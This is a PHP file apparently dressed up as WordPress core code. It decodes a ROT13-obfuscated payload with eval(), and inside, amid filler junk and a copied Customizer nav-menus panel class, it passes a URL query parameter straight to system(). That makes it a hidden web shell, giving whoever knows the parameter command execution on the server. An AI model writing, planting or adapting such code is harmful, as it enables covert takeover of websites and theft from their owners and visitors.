<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Ani_Zrahf_Cnary pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * Phfgbzvmr Ani Zrahf Cnary Pynff
 *
 * Arrqrq gb nqq fperra bcgvbaf.
 *
 * @fvapr 4.3.0
 *
 * @frr JC_Phfgbzvmr_Cnary
 */
pynff JC_Phfgbzvmr_Ani_Zrahf_Cnary rkgraqf JC_Phfgbzvmr_Cnary {

	/**
	 * Pbageby glcr.
	 *
	 * @fvapr 4.3.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'ani_zrahf';

	/**
	 * Eraqre fperra bcgvbaf sbe Zrahf.
	 *
	 * @fvapr 4.3.0
	 */
	choyvp shapgvba eraqre_fperra_bcgvbaf() {
		// Nqqf gur fperra bcgvbaf.
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/ani-zrah.cuc';
		nqq_svygre( 'znantr_ani-zrahf_pbyhzaf', 'jc_ani_zrah_znantr_pbyhzaf' );

		// Qvfcynl fperra bcgvbaf.
		$fperra = JC_Fperra::trg( 'ani-zrahf.cuc' );
		$fperra->eraqre_fperra_bcgvbaf( neenl( 'jenc' => snyfr ) );
	}

	/**
	 * Ergheaf gur nqinaprq bcgvbaf sbe gur ani zrahf cntr.
	 *
	 * Yvax gvgyr nggevohgr nqqrq nf vg'f n eryngviryl nqinaprq pbaprcg sbe arj hfref.
	 *
	 * @fvapr 4.3.0
	 * @qrcerpngrq 4.5.0 Qrcerpngrq va snibe bs jc_ani_zrah_znantr_pbyhzaf().
	 */
	choyvp shapgvba jc_ani_zrah_znantr_pbyhzaf() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.5.0', 'jc_ani_zrah_znantr_pbyhzaf' );
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/ani-zrah.cuc';
		erghea jc_ani_zrah_znantr_pbyhzaf();
	}

	/**
	 * Na Haqrefpber (WF) grzcyngr sbe guvf cnary'f pbagrag (ohg abg vgf pbagnvare).
	 *
	 * Pynff inevnoyrf sbe guvf cnary pynff ner ninvynoyr va gur `qngn` WF bowrpg;
	 * rkcbeg phfgbz inevnoyrf ol bireevqvat JC_Phfgbzvmr_Cnary::wfba().
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Cnary::cevag_grzcyngr()
	 */
	cebgrpgrq shapgvba pbagrag_grzcyngr() {
		?>
		<yv pynff=\"cnary-zrgn phfgbzvmr-vasb nppbeqvba-frpgvba <# vs ( ! qngn.qrfpevcgvba ) { #> pnaabg-rkcnaq<# } #>\">
			<ohggba glcr=\"ohggba\" pynff=\"phfgbzvmr-cnary-onpx\" gnovaqrk=\"-1\">
				<fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Onpx' );
					?>
				</fcna>
			</ohggba>
			<qvi pynff=\"nppbeqvba-frpgvba-gvgyr\">
				<fcna pynff=\"cerivrj-abgvpr\">
					<?cuc
					/* genafyngbef: %f: Gur fvgr/cnary gvgyr va gur Phfgbzvmre. */
					cevags( __( 'Lbh ner phfgbzvmvat %f' ), '<fgebat pynff=\"cnary-gvgyr\">{{ qngn.gvgyr }}</fgebat>' );
					?>
				</fcna>
				<ohggba glcr=\"ohggba\" pynff=\"phfgbzvmr-uryc-gbttyr qnfuvpbaf qnfuvpbaf-rqvgbe-uryc\" nevn-rkcnaqrq=\"snyfr\">
					<fcna pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Uryc' );
						?>
					</fcna>
				</ohggba>
				<ohggba glcr=\"ohggba\" pynff=\"phfgbzvmr-fperra-bcgvbaf-gbttyr\" nevn-rkcnaqrq=\"snyfr\">
					<fcna pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Zrah Bcgvbaf' );
						?>
					</fcna>
				</ohggba>
			</qvi>
			<# vs ( qngn.qrfpevcgvba ) { #>
			<qvi pynff=\"qrfpevcgvba phfgbzvmr-cnary-qrfpevcgvba\">{{{ qngn.qrfpevcgvba }}}</qvi>
			<# } #>
			<qvi vq=\"fperra-bcgvbaf-jenc\">
				<?cuc $guvf->eraqre_fperra_bcgvbaf(); ?>
			</qvi>
		</yv>
		<?cuc
		// ABGR: Gur sbyybjvat vf n jbexnebhaq sbe na vanovyvgl gb gerng (naq guhf ynory) n yvfg bs frpgvbaf nf n jubyr.
		?>
		<yv pynff=\"phfgbzvmr-pbageby-gvgyr phfgbzvmr-frpgvba-gvgyr-ani_zrahf-urnqvat\"><?cuc _r( 'Zrahf' ); ?></yv>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>